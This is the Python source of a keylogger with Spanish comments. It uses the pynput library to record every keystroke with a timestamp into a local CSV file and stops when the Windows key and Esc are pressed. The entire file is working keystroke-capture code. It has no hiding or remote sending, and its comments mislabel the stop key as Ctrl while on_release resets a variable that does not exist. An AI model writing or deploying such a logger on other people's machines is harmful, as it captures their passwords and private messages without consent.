import csv
from datetime import datetime
from pynput import keyboard

log_file = "key_log.csv"  # archivo para guardar los logs de las teclas
# su estructura es Timestamp - Tecla presionada

# creamos o abrimos el archivo csv de los logs
with open(log_file, mode='w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['Timestamp', 'Key'])

# Variable para llevar el estado del Ctrl izquierdo
cmd_pressed = False

# Función que se ejecuta cada vez que se presiona una tecla
def on_press(key):
    global cmd_pressed
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Obtener la marca de tiempo
    key_str = ''  # Inicializar la cadena de la tecla

    try:
        # Si es una tecla normal (letra, número, etc.)
        key_str = key.char
    except AttributeError:
        # Si es una tecla especial
        if key == keyboard.Key.space:
            key_str = "[SPACE]"  # Representar espacio con un espacio real
        elif key == keyboard.Key.enter:
            key_str = "[ENTER]"  # Representar enter con un salto de línea
        elif key == keyboard.Key.tab:
            key_str = "[TAB]"  # Representar tab con una tabulación
        elif key == keyboard.Key.backspace:
            key_str = "[BACKSPACE]"  # tecla de retroceso
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            key_str = "[SHIFT]"
        elif key == keyboard.Key.ctrl_l:  # Ctrl izquierdo
            key_str = "[CTRL]"
        elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
            key_str = "[ALT]"
        elif key == keyboard.Key.esc:
            key_str = "[ESC]"
        elif key == keyboard.Key.cmd:
            cmd_pressed = True
            key_str = "[CMD (WINDOWS)]"
        else:
            key_str = f"[{key}]"  # Mantener cualquier otra tecla especial

    # Verificar si Ctrl está presionado y si se presionó Esc
    if cmd_pressed and key == keyboard.Key.esc:
        print("Closing the keylogger...")
        return False  # Detener el listener y cerrar el programa

    # Escribir la información en el archivo CSV
    with open(log_file, mode='a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, key_str])

def on_release(key):
    global ctrl_pressed
    if key == keyboard.Key.ctrl_l:
        ctrl_pressed = False  # Liberar el estado de Ctrl

# Configurar el listener para el teclado
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
